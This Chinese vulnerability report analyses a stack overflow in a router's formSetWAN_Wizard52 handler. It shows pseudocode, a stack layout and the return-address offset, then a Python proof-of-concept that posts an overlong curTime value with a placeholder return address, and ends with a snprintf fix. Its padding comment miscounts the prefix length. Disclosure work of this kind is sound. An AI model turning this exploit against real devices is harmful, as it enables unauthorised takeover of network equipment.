# 栈溢出漏洞分析报告：formSetWAN_Wizard52

## 1. 漏洞概览

| 项目 | 详情 |
|------|------|
| **漏洞类型** | 栈缓冲区溢出 (Stack Buffer Overflow) |
| **风险等级** | 🔴 **高危 (Critical)** |
| **受影响函数** | `formSetWAN_Wizard52` (地址：`0x44a940`) |
| **触发条件** | HTTP POST 请求中超长的 `curTime` 参数 |
| **危险函数** | `sprintf` (地址：`0x44ac84`) |

---

## 2. 漏洞详情

### 2.1 伪代码分析

```c
int __fastcall formSetWAN_Wizard52(_DWORD *a1)
{
  char v29[200];      // [sp+18h] 栈缓冲区
  char v30[200];      // [sp+E0h] 栈缓冲区 ← 目标缓冲区
  
  // 获取用户输入
  v3 = websGetVar(a1, "curTime", ...);
  
  // ⚠️ 危险点：sprintf 无长度检查
  sprintf(v30, "/Basic/Wizard_WAN_complete.asp?t=%s", v3);
  
  return websRedirect(a1, v30);
}
```

### 2.2 栈帧布局

```
栈帧结构 (SP+0x1B8):
├─────────────────────────────────┤
│ v29 [200 字节]    │ SP+0x18      │
├─────────────────────────────────┤
│ v30 [200 字节]    │ SP+0xE0      │ ← 溢出目标
├─────────────────────────────────┤
│ 局部变量         │ SP+0x1A8     │
├─────────────────────────────────┤
│ 保存的寄存器     │ SP+0x1B8     │
├─────────────────────────────────┤
│ 返回地址 (RA)    │ SP+0x1C8     │ ← 攻击目标
└─────────────────────────────────┘
```

### 2.3 偏移量计算

- `v30` 起始地址：`SP + 0xE0`
- 返回地址：`SP + 0x1C8`
- **偏移量**：`0x1C8 - 0xE0 = 0xE8 = 232 字节`

---

## 3. 利用分析

### 3.1 Payload 构造

```python
import requests

TARGET_IP = "192.168.1.1"
url = f"http://{TARGET_IP}/formSetWAN_Wizard52"

# 计算偏移量
PREFIX_LENGTH = len("/Basic/Wizard_WAN_complete.asp?t=")  # 35 字节
BUFFER_SIZE = 200
OFFSET_TO_RA = 232

# 构造 payload
padding = b'A' * (OFFSET_TO_RA - PREFIX_LENGTH)  # 197 字节
ret_addr = b'\xef\xbe\xad\xde'

payload = padding + ret_addr

data = {
    "curTime": payload.decode('latin-1'),
    "config.wan_ip_address": "192.168.1.100"
}

response = requests.post(url, data=data)
print(f"Response: {response.status_code}")
```

---

## 4. 修复建议

### 4.1 代码修复

```c
// 修复前 (危险)
sprintf(v30, "/Basic/Wizard_WAN_complete.asp?t=%s", v3);

// 修复后 (安全)
snprintf(v30, sizeof(v30), "/Basic/Wizard_WAN_complete.asp?t=%s", v3);
```

---

**报告生成时间**: 2026-03-05  
**分析工具**: IDA Pro MCP + StackHunter
